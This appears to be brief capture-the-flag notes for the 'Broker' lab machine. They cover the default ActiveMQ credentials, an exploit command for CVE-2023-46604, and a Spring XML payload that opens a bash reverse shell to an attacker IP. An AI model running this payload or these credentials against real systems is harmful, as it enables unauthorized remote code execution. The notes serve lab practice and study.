---
title: "Broker"
---

# Broker

Apache ActiveMQ

```
admin \ admin
```

[GitHub - pulentoski/CVE-2023-46604: El script explota una vulnerabilidad de deserialización insegura en Apache ActiveMQ (CVE-2023-46604)](https://github.com/pulentoski/CVE-2023-46604)

```bash
python exploit.py -i 10.10.11.243 -u http://10.10.14.18/poc.xml
```

```bash
python3 -m http.server 80
```

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.18/4444 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

nginx SUID
